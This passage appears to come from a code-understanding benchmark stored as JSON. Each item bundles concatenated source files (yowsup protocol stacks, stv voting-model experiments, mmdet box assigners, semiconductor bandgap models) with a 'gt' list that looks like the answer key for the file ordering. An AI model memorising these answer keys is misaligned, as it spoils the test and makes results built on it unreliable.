layerClass):\n        self.__stack.push(layerClass)\n\n    def addPostConstructLayer(self, layer):\n        self.__stackInstances[-1].setLayers(layer, self.__stackInstances[-2])\n        layer.setLayers(None, self.__stackInstances[-1])\n        self.__stackInstances.append(layer)\n\n    def setProp(self, key, value):\n        self._props[key] = value\n\n    def getProp(self, key, default = None):\n        return self._props[key] if key in self._props else default\n\n    def emitEvent(self, yowLayerEvent):\n        if not self.__stackInstances[0].onEvent(yowLayerEvent):\n            self.__stackInstances[0].emitEvent(yowLayerEvent)\n\n    def broadcastEvent(self, yowLayerEvent):\n        if not self.__stackInstances[-1].onEvent(yowLayerEvent):\n            self.__stackInstances[-1].broadcastEvent(yowLayerEvent)\n\n    def execDetached(self, fn):\n        self.__class__.__detachedQueue.put(fn)\n\n    def loop(self, *args, **kwargs):\n        while True:\n            try:\n                callback = self.__class__.__detachedQueue.get(False)\n                callback()\n            except Queue.Empty:\n                pass\n            time.sleep(0.1)\n\n    def _construct(self):\n        logger.debug(\"Initializing stack\")\n        for s in self.__stack:\n            if type(s) is tuple:\n                logger.warn(\"Implicit declaration of parallel layers in a tuple is deprecated, pass a YowParallelLayer instead\")\n                inst = YowParallelLayer(s)\n            else:\n                if inspect.isclass(s):\n                    if issubclass(s, YowLayer):\n                        inst = s()\n                    else:\n                        raise ValueError(\"Stack must contain only subclasses of YowLayer\")\n                elif issubclass(s.__class__, YowLayer):\n                        inst = s\n                else:\n                    raise ValueError(\"Stack must contain only subclasses of YowLayer\")\n\n            logger.debug(\"Constructed %s\" % inst)\n            inst.setStack(self)\n            self.__stackInstances.append(inst)\n\n        for i in range(0, len(self.__stackInstances)):\n            upperLayer = self.__stackInstances[i + 1] if (i + 1) < len(self.__stackInstances) else None\n            lowerLayer = self.__stackInstances[i - 1] if i > 0 else None\n            self.__stackInstances[i].setLayers(upperLayer, lowerLayer)\n\n    def getLayer(self, layerIndex):\n        return self.__stackInstances[layerIndex]\n\n'yowsup/yowsup/stacks/__init__.py'\n:from .yowstack import YowStack, YowStackBuilder\n\nfrom yowsup.layers.auth                        import YowAuthenticationProtocolLayer\nfrom yowsup.layers.coder                       import YowCoderLayer\nfrom yowsup.layers.logger                      import YowLoggerLayer\nfrom yowsup.layers.network                     import YowNetworkLayer\nfrom yowsup.layers.protocol_messages           import YowMessagesProtocolLayer\nfrom yowsup.layers.protocol_media              import YowMediaProtocolLayer\nfrom yowsup.layers.protocol_acks               import YowAckProtocolLayer\nfrom yowsup.layers.protocol_receipts           import YowReceiptProtocolLayer\nfrom yowsup.layers.protocol_groups             import YowGroupsProtocolLayer\nfrom yowsup.layers.protocol_presence           import YowPresenceProtocolLayer\nfrom yowsup.layers.protocol_ib                 import YowIbProtocolLayer\nfrom yowsup.layers.protocol_notifications      import YowNotificationsProtocolLayer\nfrom yowsup.layers.protocol_iq                 import YowIqProtocolLayer\nfrom yowsup.layers.protocol_contacts           import YowContactsIqProtocolLayer\nfrom yowsup.layers.protocol_chatstate          import YowChatstateProtocolLayer\nfrom yowsup.layers.protocol_privacy            import YowPrivacyProtocolLayer\nfrom yowsup.layers.protocol_profiles           import YowProfilesProtocolLayer\nfrom yowsup.layers.protocol_calls              import YowCallsProtocolLayer\nfrom yowsup.layers.noise.layer                 import YowNoiseLayer\nfrom yowsup.layers.noise.layer_noise_segments  import YowNoiseSegmentsLayer\n\n\n\nYOWSUP_CORE_LAYERS = (\n    YowLoggerLayer,\n    YowCoderLayer,\n    YowNoiseLayer,\n    YowNoiseSegmentsLayer,\n    YowNetworkLayer\n)\n\n\nYOWSUP_PROTOCOL_LAYERS_BASIC = (\n    YowAuthenticationProtocolLayer, YowMessagesProtocolLayer,\n    YowReceiptProtocolLayer, YowAckProtocolLayer, YowPresenceProtocolLayer,\n    YowIbProtocolLayer, YowIqProtocolLayer, YowNotificationsProtocolLayer,\n    YowContactsIqProtocolLayer, YowChatstateProtocolLayer\n\n)\n\nYOWSUP_PROTOCOL_LAYERS_GROUPS = (YowGroupsProtocolLayer,) + YOWSUP_PROTOCOL_LAYERS_BASIC\nYOWSUP_PROTOCOL_LAYERS_MEDIA  = (YowMediaProtocolLayer,) + YOWSUP_PROTOCOL_LAYERS_BASIC\nYOWSUP_PROTOCOL_LAYERS_PROFILES  = (YowProfilesProtocolLayer,) + YOWSUP_PROTOCOL_LAYERS_BASIC\nYOWSUP_PROTOCOL_LAYERS_CALLS  = (YowCallsProtocolLayer,) + YOWSUP_PROTOCOL_LAYERS_BASIC\nYOWSUP_PROTOCOL_LAYERS_FULL = (YowGroupsProtocolLayer, YowMediaProtocolLayer, YowPrivacyProtocolLayer, YowProfilesProtocolLayer, YowCallsProtocolLayer)\\\n                              + YOWSUP_PROTOCOL_LAYERS_BASIC\n\n\nYOWSUP_FULL_STACK = (YOWSUP_PROTOCOL_LAYERS_FULL,) +\\\n                     YOWSUP_CORE_LAYERS\n",
        "gt": [
            "'yowsup/yowsup/layers/protocol_receipts/layer.py'",
            "'yowsup/yowsup/layers/protocol_receipts/__init__.py'",
            "'yowsup/yowsup/stacks/yowstack.py'",
            "'yowsup/yowsup/stacks/__init__.py'",
            "'yowsup/yowsup/demos/sendclient/stack.py'",
            "'yowsup/yowsup/demos/sendclient/__init__.py'"
        ]
    },
    {
        "files": [
            "'stv/stv/experiments/approximations/strategy_logic/__init__.py'",
            "'stv/stv/tests/experiments/approximations/strategy_logic/test_simple_voting_2_model_experiments.py'",
            "'stv/stv/experiments/approximations/strategy_logic/simple_voting_2_model_experiments.py'",
            "'stv/stv/models/synchronous/__init__.py'",
            "'stv/stv/models/synchronous/random_model.py'"
        ],
        "content": "'stv/stv/experiments/approximations/strategy_logic/__init__.py'\n:from .simple_voting_2_model_experiments import SimpleVoting2ModelExperiments\n'stv/stv/tests/experiments/approximations/strategy_logic/test_simple_voting_2_model_experiments.py'\n:from stv.experiments.approximations.strategy_logic import SimpleVoting2ModelExperiments\nimport unittest\n\n\nclass SimpleVoting2ModelExperimentsTestSuite(unittest.TestCase):\n    def test_sanity(self):\n        pass\n\n\nif __name__ == '__main__':\n    unittest.main()\n\n'stv/stv/experiments/approximations/strategy_logic/simple_voting_2_model_experiments.py'\n:from stv.models.synchronous.simple_voting_2_model import SimpleVoting2Model\nimport time\n\n\nclass SimpleVoting2ModelExperiments:\n    def __init__(self, no_candidates: int, no_voters: int):\n        self.no_candidates = no_candidates\n        self.no_voters = no_voters\n        self.model = None\n        self.time_generation = 0\n\n    def run_experiments(self):\n        self.generate_model()\n        quant_pref = [('Exist', 'se'), ('All', 'sc'), ('Exist', 'sv')]\n        bind_pref = [('se', 0), ('sc', 1), ('sv', 2)]\n\n        for voter_id in range(1, self.no_voters):\n            quant_pref.append(('Exist', f'sv{voter_id}'))\n            bind_pref.append((f'sv{voter_id}', voter_id + 2))\n\n        formula = 'F (end_v & vote_v_0 & !punish_v)'\n\n        winning_states = []\n        state_id = -1\n        voter_id = 0\n        for state in self.model.states:\n            state_id += 1\n            if state['finish'][voter_id] and state['vote'][voter_id] == 0 and not state['pun'][voter_id]:\n                winning_states.append(state_id)\n\n        sl_model = self.model.model.to_sl_perfect(self.model.get_actions())\n\n        start = time.perf_counter()\n        result = sl_model.verify(winning_states, quant_pref, bind_pref)\n        stop = time.perf_counter()\n\n        time_verification = stop - start\n\n\n\n        formula_result = False\n\n        if 0 in result:\n            formula_result = True\n            print(\"True\")\n        else:\n            print(\"False\")\n\n        file = open(\"results-sv2.txt\", \"a\")\n        file.write(f\"no_candidates: {self.no_candidates}\\n\")\n        file.write(f\"no_voters: {self.no_voters}\\n\")\n        file.write(f\"no_states: {len(self.model.states)}\\n\")\n        file.write(f\"generation time: {self.time_generation}\\n\")\n        file.write(f\"verification time: {time_verification}\\n\")\n        file.write(f\"formula result: {formula_result}\\n\")\n        file.write(\"\\n\\n\")\n\n        file.close()\n\n    def generate_model(self):\n        start = time.perf_counter()\n        self.model = SimpleVoting2Model(self.no_voters, self.no_candidates)\n        self.model.generate()\n        stop = time.perf_counter()\n        self.time_generation = stop - start\n\n        print(self.time_generation)\n        print(len(self.model.states))\n\n\nif __name__ == \"__main__\":\n    simple_voting2_model_experiments = SimpleVoting2ModelExperiments(2, 2)\n    simple_voting2_model_experiments.run_experiments()\n\n'stv/stv/models/synchronous/__init__.py'\n:from .bridge_model import BridgeModel\nfrom .castle_model import CastleModel\nfrom .dining_cryptographers import DiningCryptographers\nfrom .drone_model import DroneModel, CracowMap\nfrom .machine_model import MachineModel, MachineModelWaiting, MachineModelWithCharging, MachineModelWithStorage\nfrom .tian_ji_model import TianJiModel\nfrom .random_model import RandomModel\nfrom .simple_voting_model import SimpleVotingModel, SimpleVoting2Model\n'stv/stv/models/synchronous/random_model.py'\n:from stv.models.model_generator import ModelGenerator\nfrom typing import List\nimport random\nimport math\n\n\nclass RandomModel(ModelGenerator):\n    def __init__(self, max_states: int = 20):\n        super().__init__(agents_count=2)\n        self.__max_states = max_states\n\n        self.__max_epistemic_classes = int(self.__max_states // math.log2(self.__max_states))\n        self.__max_winning_states = random.randint(1, self.__max_states // 5)\n        self.__path_length = random.randint(self.__max_states // 4, 3 * self.__max_states // 4)\n        self.__paths_count = random.randint(self.__max_states * 2, self.__max_states * 4)\n        self.__max_action = 1\n        self.__random_connections_count = random.randint(self.__max_states // 4, self.__max_states * 4)\n\n\n\n        self.state_epistemic_class = [i for i in range(self.__max_states + 1)]\n\n        epistemic_classes_count = 0\n        for epistemic_class_id in range(self.__max_states + 2, self.__max_states + 2 + self.__max_epistemic_classes):\n\n            epistemic_class_size = int(math.log2(self.__max_states))\n            epistemic_classes_count += 1\n            for i in range(0, epistemic_class_size):\n                state_id = random.randint(1, self.__max_states)\n                cnt = 0\n                while cnt < self.__max_states and self.state_epistemic_class[state_id] > self.__max_states + 1:\n                    state_id = random.randint(1, self.__max_states)\n                    cnt += 1\n                if cnt >= self.__max_states:\n                    epistemic_classes_count -= 1\n                    break\n                self.state_epistemic_class[state_id] = epistemic_class_id\n        self.state_epistemic_class[0] = 0\n        print(f\"Max epistemic classes: {self.__max_epistemic_classes}\")\n        print(epistemic_classes_count)\n        print(self.state_epistemic_class)\n        self.winning_states = [False for _ in range(self.__max_states + 1)]\n        self.__paths: List[List[int]] = []\n        self.__graph = [set() for _ in range(self.__max_states + 1)]\n\n    def _generate_initial_states(self):\n        self._add_state({'id': 0, 'epistemic_class': self.state_epistemic_class[0]})\n\n    def _generate_model(self):\n        self._generate_paths()\n        self._generate_winning_states()\n        self._generate_random_connections()\n        self._generate_transitions()\n\n    def _generate_paths(self):\n        state_dist = self.__max_states // self.__path_length\n        for _ in range(self.__paths_count):\n            path = [random.randint(0, state_dist)]\n            for _ in range(self.__path_length):\n                next_state = random.randint(path[-1] + 1, path[-1] + 1 + state_dist)\n                if next_state >= self.__max_states:\n                    break\n                self.__graph[path[-1]].add(next_state)\n                self.__max_action = max(self.__max_action, len(self.__graph[-1]))\n                path.append(next_state)\n            self.__paths.append(path[:])\n        self.__max_action += 30\n\n    def _generate_winning_states(self):\n        for _ in range(self.__max_winning_states):\n            self.winning_states[self.__paths[random.randint(0, len(self.__paths) - 1)][-1]] = True\n\n    def _generate_random_connections(self):\n        for _ in range(self.__random_connections_count):\n            path_a = self.__paths[random.randint(0, len(self.__paths) - 1)]\n            path_b = self.__paths[random.randint(0, len(self.__paths) - 1)]\n            state_a = random.choice(path_a)\n            state_b = random.choice(path_b)\n            self.__graph[state_a].add(state_b)\n\n    def _generate_transitions(self):\n        for state_id in range(len(self.__graph)):\n            next_states = list(self.__graph[state_id])\n            if len(next_states) == 0:\n                continue\n            next_states_numbers = []\n            state_number = self._add_state({'id': state_id, 'epistemic_class': self.state_epistemic_class[state_id]})\n            n_action = 0\n            for next_state in next_states:\n                next_states_numbers.append(\n                    self._add_state({'id': next_state, 'epistemic_class': self.state_epistemic_class[next_state]}))\n\n\n\n\n\n            for action in range(n_action, self.__max_action + 1):\n                r_from = random.randint(0, len(next_states_numbers) - 1)\n                count = random.randint(1, max(len(next_states_numbers), 2))\n                for i in range(r_from, min(r_from + count, len(next_states_numbers))):\n                    next_state_number = next_states_numbers[i]\n                    self.model.add_transition(state_number, next_state_number, [str(action)])\n\n    def _get_epistemic_state(self, state, agent_no):\n        return {'epistemic_class': state['epistemic_class']}\n\n    def _get_props_for_state(self, state: hash) -> List[str]:\n        if self.winning_states[state['id']]:\n            return [\"win\"]\n        return []\n\n    def get_actions(self) -> List[List[str]]:\n        result = [[]]\n        for i in range(self.__max_action + 1):\n            result[0].append(str(i))\n        return result\n\n    def get_props_list(self) -> List[str]:\n        return [\"win\"]\n\n\nif __name__ == \"__main__\":\n    model = RandomModel(100)\n    model.generate()",
        "gt": [
            "'stv/stv/models/synchronous/random_model.py'",
            "'stv/stv/models/synchronous/__init__.py'",
            "'stv/stv/experiments/approximations/strategy_logic/simple_voting_2_model_experiments.py'",
            "'stv/stv/experiments/approximations/strategy_logic/__init__.py'",
            "'stv/stv/tests/experiments/approximations/strategy_logic/test_simple_voting_2_model_experiments.py'"
        ]
    },
    {
        "files": [
            "'EfficientDet-bifpn/tests/test_assigner.py'",
            "'EfficientDet-bifpn/mmdet/core/bbox/assigners/atss_assigner.py'",
            "'EfficientDet-bifpn/mmdet/core/bbox/assigners/__init__.py'",
            "'EfficientDet-bifpn/mmdet/core/bbox/assigners/base_assigner.py'"
        ],
        "content": "'EfficientDet-bifpn/tests/test_assigner.py'\n:\nimport torch\n\nfrom mmdet.core import MaxIoUAssigner\nfrom mmdet.core.bbox.assigners import ApproxMaxIoUAssigner, PointAssigner\n\n\ndef test_max_iou_assigner():\n    self = MaxIoUAssigner(\n        pos_iou_thr=0.5,\n        neg_iou_thr=0.5,\n    )\n    bboxes = torch.FloatTensor([\n        [0, 0, 10, 10],\n        [10, 10, 20, 20],\n        [5, 5, 15, 15],\n        [32, 32, 38, 42],\n    ])\n    gt_bboxes = torch.FloatTensor([\n        [0, 0, 10, 9],\n        [0, 10, 10, 19],\n    ])\n    gt_labels = torch.LongTensor([2, 3])\n    assign_result = self.assign(bboxes, gt_bboxes, gt_labels=gt_labels)\n    assert len(assign_result.gt_inds) == 4\n    assert len(assign_result.labels) == 4\n\n    expected_gt_inds = torch.LongTensor([1, 0, 2, 0])\n    assert torch.all(assign_result.gt_inds == expected_gt_inds)\n\n\ndef test_max_iou_assigner_with_ignore():\n    self = MaxIoUAssigner(\n        pos_iou_thr=0.5,\n        neg_iou_thr=0.5,\n        ignore_iof_thr=0.5,\n        ignore_wrt_candidates=False,\n    )\n    bboxes = torch.FloatTensor([\n        [0, 0, 10, 10],\n        [10, 10, 20, 20],\n        [5, 5, 15, 15],\n        [32, 32, 38, 42],\n    ])\n    gt_bboxes = torch.FloatTensor([\n        [0, 0, 10, 9],\n        [0, 10, 10, 19],\n    ])\n    gt_bboxes_ignore = torch.Tensor([\n        [30, 30, 40, 40],\n    ])\n    assign_result = self.assign(\n        bboxes, gt_bboxes, gt_bboxes_ignore=gt_bboxes_ignore)\n\n    expected_gt_inds = torch.LongTensor([1, 0, 2, -1])\n    assert torch.all(assign_result.gt_inds == expected_gt_inds)\n\n\ndef test_max_iou_assigner_with_empty_gt():\n\n    self = MaxIoUAssigner(\n        pos_iou_thr=0.5,\n        neg_iou_thr=0.5,\n    )\n    bboxes = torch.FloatTensor([\n        [0, 0, 10, 10],\n        [10, 10, 20, 20],\n        [5, 5, 15, 15],\n        [32, 32, 38, 42],\n    ])\n    gt_bboxes = torch.FloatTensor([])\n    assign_result = self.assign(bboxes, gt_bboxes)\n\n    expected_gt_inds = torch.LongTensor([0, 0, 0, 0])\n    assert torch.all(assign_result.gt_inds == expected_gt_inds)\n\n\ndef test_max_iou_assigner_with_empty_boxes():\n\n    self = MaxIoUAssigner(\n        pos_iou_thr=0.5,\n        neg_iou_thr=0.5,\n    )\n    bboxes = torch.empty((0, 4))\n    gt_bboxes = torch.FloatTensor([\n        [0, 0, 10, 9],\n        [0, 10, 10, 19],\n    ])\n    gt_labels = torch.LongTensor([2, 3])\n\n\n    assign_result = self.assign(bboxes, gt_bboxes, gt_labels=gt_labels)\n    assert len(assign_result.gt_inds) == 0\n    assert tuple(assign_result.labels.shape) == (0, )\n\n\n    assign_result = self.assign(bboxes, gt_bboxes, gt_labels=None)\n    assert len(assign_result.gt_inds) == 0\n    assert assign_result.labels is None\n\n\ndef test_max_iou_assigner_with_empty_boxes_and_ignore():\n\n    self = MaxIoUAssigner(\n        pos_iou_thr=0.5,\n        neg_iou_thr=0.5,\n        ignore_iof_thr=0.5,\n    )\n    bboxes = torch.empty((0, 4))\n    gt_bboxes = torch.FloatTensor([\n        [0, 0, 10, 9],\n        [0, 10, 10, 19],\n    ])\n    gt_bboxes_ignore = torch.Tensor([\n        [30, 30, 40, 40],\n    ])\n    gt_labels = torch.LongTensor([2, 3])\n\n\n    assign_result = self.assign(\n        bboxes,\n        gt_bboxes,\n        gt_labels=gt_labels,\n        gt_bboxes_ignore=gt_bboxes_ignore)\n    assert len(assign_result.gt_inds) == 0\n    assert tuple(assign_result.labels.shape) == (0, )\n\n\n    assign_result = self.assign(\n        bboxes, gt_bboxes, gt_labels=None, gt_bboxes_ignore=gt_bboxes_ignore)\n    assert len(assign_result.gt_inds) == 0\n    assert assign_result.labels is None\n\n\ndef test_max_iou_assigner_with_empty_boxes_and_gt():\n\n    self = MaxIoUAssigner(\n        pos_iou_thr=0.5,\n        neg_iou_thr=0.5,\n    )\n    bboxes = torch.empty((0, 4))\n    gt_bboxes = torch.empty((0, 4))\n    assign_result = self.assign(bboxes, gt_bboxes)\n    assert len(assign_result.gt_inds) == 0\n\n\ndef test_point_assigner():\n    self = PointAssigner()\n    points = torch.FloatTensor([\n        [0, 0, 1],\n        [10, 10, 1],\n        [5, 5, 1],\n        [32, 32, 1],\n    ])\n    gt_bboxes = torch.FloatTensor([\n        [0, 0, 10, 9],\n        [0, 10, 10, 19],\n    ])\n    assign_result = self.assign(points, gt_bboxes)\n    expected_gt_inds = torch.LongTensor([1, 2, 1, 0])\n    assert torch.all(assign_result.gt_inds == expected_gt_inds)\n\n\ndef test_point_assigner_with_empty_gt():\n\n    self = PointAssigner()\n    points = torch.FloatTensor([\n        [0, 0, 1],\n        [10, 10, 1],\n        [5, 5, 1],\n        [32, 32, 1],\n    ])\n    gt_bboxes = torch.FloatTensor([])\n    assign_result = self.assign(points, gt_bboxes)\n\n    expected_gt_inds = torch.LongTensor([0, 0, 0, 0])\n    assert torch.all(assign_result.gt_inds == expected_gt_inds)\n\n\ndef test_point_assigner_with_empty_boxes_and_gt():\n\n    self = PointAssigner()\n    points = torch.FloatTensor([])\n    gt_bboxes = torch.FloatTensor([])\n    assign_result = self.assign(points, gt_bboxes)\n    assert len(assign_result.gt_inds) == 0\n\n\ndef test_approx_iou_assigner():\n    self = ApproxMaxIoUAssigner(\n        pos_iou_thr=0.5,\n        neg_iou_thr=0.5,\n    )\n    bboxes = torch.FloatTensor([\n        [0, 0, 10, 10],\n        [10, 10, 20, 20],\n        [5, 5, 15, 15],\n        [32, 32, 38, 42],\n    ])\n    gt_bboxes = torch.FloatTensor([\n        [0, 0, 10, 9],\n        [0, 10, 10, 19],\n    ])\n    approxs_per_octave = 1\n    approxs = bboxes\n    squares = bboxes\n    assign_result = self.assign(approxs, squares, approxs_per_octave,\n                                gt_bboxes)\n\n    expected_gt_inds = torch.LongTensor([1, 0, 2, 0])\n    assert torch.all(assign_result.gt_inds == expected_gt_inds)\n\n\ndef test_approx_iou_assigner_with_empty_gt():\n\n    self = ApproxMaxIoUAssigner(\n        pos_iou_thr=0.5,\n        neg_iou_thr=0.5,\n    )\n    bboxes = torch.FloatTensor([\n        [0, 0, 10, 10],\n        [10, 10, 20, 20],\n        [5, 5, 15, 15],\n        [32, 32, 38, 42],\n    ])\n    gt_bboxes = torch.FloatTensor([])\n    approxs_per_octave = 1\n    approxs = bboxes\n    squares = bboxes\n    assign_result = self.assign(approxs, squares, approxs_per_octave,\n                                gt_bboxes)\n\n    expected_gt_inds = torch.LongTensor([0, 0, 0, 0])\n    assert torch.all(assign_result.gt_inds == expected_gt_inds)\n\n\ndef test_approx_iou_assigner_with_empty_boxes():\n\n    self = ApproxMaxIoUAssigner(\n        pos_iou_thr=0.5,\n        neg_iou_thr=0.5,\n    )\n    bboxes = torch.empty((0, 4))\n    gt_bboxes = torch.FloatTensor([\n        [0, 0, 10, 9],\n        [0, 10, 10, 19],\n    ])\n    approxs_per_octave = 1\n    approxs = bboxes\n    squares = bboxes\n    assign_result = self.assign(approxs, squares, approxs_per_octave,\n                                gt_bboxes)\n    assert len(assign_result.gt_inds) == 0\n\n\ndef test_approx_iou_assigner_with_empty_boxes_and_gt():\n\n    self = ApproxMaxIoUAssigner(\n        pos_iou_thr=0.5,\n        neg_iou_thr=0.5,\n    )\n    bboxes = torch.empty((0, 4))\n    gt_bboxes = torch.empty((0, 4))\n    approxs_per_octave = 1\n    approxs = bboxes\n    squares = bboxes\n    assign_result = self.assign(approxs, squares, approxs_per_octave,\n                                gt_bboxes)\n    assert len(assign_result.gt_inds) == 0\n\n\ndef test_random_assign_result():\n\n    from mmdet.core.bbox.assigners.assign_result import AssignResult\n    AssignResult.random()\n\n    AssignResult.random(num_gts=0, num_preds=0)\n    AssignResult.random(num_gts=0, num_preds=3)\n    AssignResult.random(num_gts=3, num_preds=3)\n    AssignResult.random(num_gts=0, num_preds=3)\n    AssignResult.random(num_gts=7, num_preds=7)\n    AssignResult.random(num_gts=7, num_preds=64)\n    AssignResult.random(num_gts=24, num_preds=3)\n\n'EfficientDet-bifpn/mmdet/core/bbox/assigners/atss_assigner.py'\n:import torch\n\nfrom ..geometry import bbox_overlaps\nfrom .assign_result import AssignResult\nfrom .base_assigner import BaseAssigner\n\n\nclass ATSSAssigner(BaseAssigner):\n\n\n    def __init__(self, topk):\n        self.topk = topk\n\n\n\n    def assign(self,\n               bboxes,\n               num_level_bboxes,\n               gt_bboxes,\n               gt_bboxes_ignore=None,\n               gt_labels=None):\n\n        INF = 100000000\n        bboxes = bboxes[:, :4]\n        num_gt, num_bboxes = gt_bboxes.size(0), bboxes.size(0)\n\n\n        overlaps = bbox_overlaps(bboxes, gt_bboxes)\n\n\n        assigned_gt_inds = overlaps.new_full((num_bboxes, ),\n                                             0,\n                                             dtype=torch.long)\n\n        if num_gt == 0 or num_bboxes == 0:\n\n            max_overlaps = overlaps.new_zeros((num_bboxes, ))\n            if num_gt == 0:\n\n                assigned_gt_inds[:] = 0\n            if gt_labels is None:\n                assigned_labels = None\n            else:\n                assigned_labels = overlaps.new_zeros((num_bboxes, ),\n                                                     dtype=torch.long)\n            return AssignResult(\n                num_gt, assigned_gt_inds, max_overlaps, labels=assigned_labels)\n\n\n        gt_cx = (gt_bboxes[:, 0] + gt_bboxes[:, 2]) / 2.0\n        gt_cy = (gt_bboxes[:, 1] + gt_bboxes[:, 3]) / 2.0\n        gt_points = torch.stack((gt_cx, gt_cy), dim=1)\n\n        bboxes_cx = (bboxes[:, 0] + bboxes[:, 2]) / 2.0\n        bboxes_cy = (bboxes[:, 1] + bboxes[:, 3]) / 2.0\n        bboxes_points = torch.stack((bboxes_cx, bboxes_cy), dim=1)\n\n        distances = (bboxes_points[:, None, :] -\n                     gt_points[None, :, :]).pow(2).sum(-1).sqrt()\n\n\n        candidate_idxs = []\n        start_idx = 0\n        for level, bboxes_per_level in enumerate(num_level_bboxes):\n\n\n            end_idx = start_idx + bboxes_per_level\n            distances_per_level = distances[start_idx:end_idx, :]\n            _, topk_idxs_per_level = distances_per_level.topk(\n                self.topk, dim=0, largest=False)\n            candidate_idxs.append(topk_idxs_per_level + start_idx)\n            start_idx = end_idx\n        candidate_idxs = torch.cat(candidate_idxs, dim=0)\n\n\n\n        candidate_overlaps = overlaps[candidate_idxs, torch.arange(num_gt)]\n        overlaps_mean_per_gt = candidate_overlaps.mean(0)\n        overlaps_std_per_gt = candidate_overlaps.std(0)\n        overlaps_thr_per_gt = overlaps_mean_per_gt + overlaps_std_per_gt\n\n        is_pos = candidate_overlaps >= overlaps_thr_per_gt[None, :]\n\n\n        for gt_idx in range(num_gt):\n            candidate_idxs[:, gt_idx] += gt_idx * num_bboxes\n        ep_bboxes_cx = bboxes_cx.view(1, -1).expand(\n            num_gt, num_bboxes).contiguous().view(-1)\n        ep_bboxes_cy = bboxes_cy.view(1, -1).expand(\n            num_gt, num_bboxes).contiguous().view(-1)\n        candidate_idxs = candidate_idxs.view(-1)\n\n\n\n        l_ = ep_bboxes_cx[candidate_idxs].view(-1, num_gt) - gt_bboxes[:, 0]\n        t_ = ep_bboxes_cy[candidate_idxs].view(-1, num_gt) - gt_bboxes[:, 1]\n        r_ = gt_bboxes[:, 2] - ep_bboxes_cx[candidate_idxs].view(-1, num_gt)\n        b_ = gt_bboxes[:, 3] - ep_bboxes_cy[candidate_idxs].view(-1, num_gt)\n        is_in_gts = torch.stack([l_, t_, r_, b_], dim=1).min(dim=1)[0] > 0.01\n        is_pos = is_pos & is_in_gts\n\n\n\n        overlaps_inf = torch.full_like(overlaps,\n                                       -INF).t().contiguous().view(-1)\n        index = candidate_idxs.view(-1)[is_pos.view(-1)]\n        overlaps_inf[index] = overlaps.t().contiguous().view(-1)[index]\n        overlaps_inf = overlaps_inf.view(num_gt, -1).t()\n\n        max_overlaps, argmax_overlaps = overlaps_inf.max(dim=1)\n        assigned_gt_inds[\n            max_overlaps != -INF] = argmax_overlaps[max_overlaps != -INF] + 1\n\n        if gt_labels is not None:\n            assigned_labels = assigned_gt_inds.new_zeros((num_bboxes, ))\n            pos_inds = torch.nonzero(assigned_gt_inds > 0).squeeze()\n            if pos_inds.numel() > 0:\n                assigned_labels[pos_inds] = gt_labels[\n                    assigned_gt_inds[pos_inds] - 1]\n        else:\n            assigned_labels = None\n        return AssignResult(\n            num_gt, assigned_gt_inds, max_overlaps, labels=assigned_labels)\n\n'EfficientDet-bifpn/mmdet/core/bbox/assigners/__init__.py'\n:from .approx_max_iou_assigner import ApproxMaxIoUAssigner\nfrom .assign_result import AssignResult\nfrom .atss_assigner import ATSSAssigner\nfrom .base_assigner import BaseAssigner\nfrom .max_iou_assigner import MaxIoUAssigner\nfrom .point_assigner import PointAssigner\n\n__all__ = [\n    'BaseAssigner', 'MaxIoUAssigner', 'ApproxMaxIoUAssigner', 'AssignResult',\n    'PointAssigner', 'ATSSAssigner'\n]\n\n'EfficientDet-bifpn/mmdet/core/bbox/assigners/base_assigner.py'\n:from abc import ABCMeta, abstractmethod\n\n\nclass BaseAssigner(metaclass=ABCMeta):\n\n    @abstractmethod\n    def assign(self, bboxes, gt_bboxes, gt_bboxes_ignore=None, gt_labels=None):\n        pass\n",
        "gt": [
            "'EfficientDet-bifpn/mmdet/core/bbox/assigners/base_assigner.py'",
            "'EfficientDet-bifpn/mmdet/core/bbox/assigners/atss_assigner.py'",
            "'EfficientDet-bifpn/mmdet/core/bbox/assigners/__init__.py'",
            "'EfficientDet-bifpn/tests/test_assigner.py'"
        ]
    },
    {
        "files": [
            "'semiconductor/src/semiconductor/material/bandgap_intrinsic_models.py'",
            "'semiconductor/src/semiconductor/recombination/__init__.py'",
            "'semiconductor/src/semiconductor/material/bandgap_intrinsic.py'",
            "'semiconductor/src/semiconductor/material/__init__.py'",
            "'semiconductor/src/semiconductor/recombination/extrinsic.py'",
            "'semiconductor/src/semiconductor/material/bandgap.py'"
        ],
        "content": "'semiconductor/src/semiconductor/material/bandgap_intrinsic_models.py'\n:\nimport numpy as np\n\n\ndef Passler(vals, temp):\n\n\n    if not isinstance(temp, np.ndarray):\n        temp = np.asarray([temp])\n\n    if np.all(temp == 0):\n        gamma = 0\n    else:\n        gamma = (1. - 3. * vals['delta']**2) / \\\n            (np.exp(vals['theta'] / temp) - 1)\n\n    xi = 2. * temp / vals['theta']\n\n\n    No2 = np.pi**2. * xi**2. / (3. * (1 + vals['delta']**2))\n    No3 = (3. * vals['delta']**2 - 1) / 4. * xi**3\n    No4 = 8. / 3. * xi**4.\n    No5 = xi**6.\n\n    E = vals['E0'] - vals['alpha'] * vals['theta'] * \\\n        (gamma + 3. * vals['delta']**2 / 2 *\n         ((1. + No2 + No3 + No4 + No5)**(1. / 6.) - 1))\n    return E\n\n\ndef Varshni(vals, temp):\n    '''\n    Passler's paper suggests that this model is for very\n    high dispersion relations  Delta  = 5/4\n    '''\n    if not isinstance(temp, np.ndarray):\n        temp = np.asarray([temp])\n\n    if np.all(temp == 0):\n        Eg = vals['E0']\n    else:\n        Eg = vals['E0'] - vals['alpha'] * temp**2 / (temp + vals['beta'])\n    return Eg\n\n\ndef Cubic_partial(vals, temp):\n    '''\n    Is a cublic paramterisation for several given temp range, spliced together.\n    The first paper where this is seen for silicon is believed to be\n    Bludau in 1974 10.1063/1.1663501.\n\n    inputs:\n        vals a dictionary containing the coefs for a fit in the from\n            Eg = \\sum_{i=0}^3 ai + bi \\times temp + ci \\times temp^2\n        and the temp range for each coeffieinct given by \"ti\". It is assumed\n        that the ith values apply up to this temperature value.\n\n    output:\n        returns the band gap in eV\n    '''\n\n\n\n    temp = np.asarray([temp * 1.]).flatten()\n\n    Eg = np.copy(temp)\n\n    for i in [2, 1, 0]:\n\n        index = temp < float(vals['T' + str(i)])\n\n        Eg[index] = vals['A' + str(i)] + \\\n            vals['B' + str(i)] * temp[index] + \\\n            vals['C' + str(i)] * temp[index]**2.\n\n    if np.any(temp > vals['T2']):\n        print('\\nWarning:'\n              '\\n\\tIntrinsic bandgap does not cover this temperature range\\n')\n        index = temp > vals['T2']\n        Eg[index] = vals['A2'] + \\\n            vals['B2'] * temp[index] + \\\n            vals['C2'] * temp[index]**2.\n\n    return 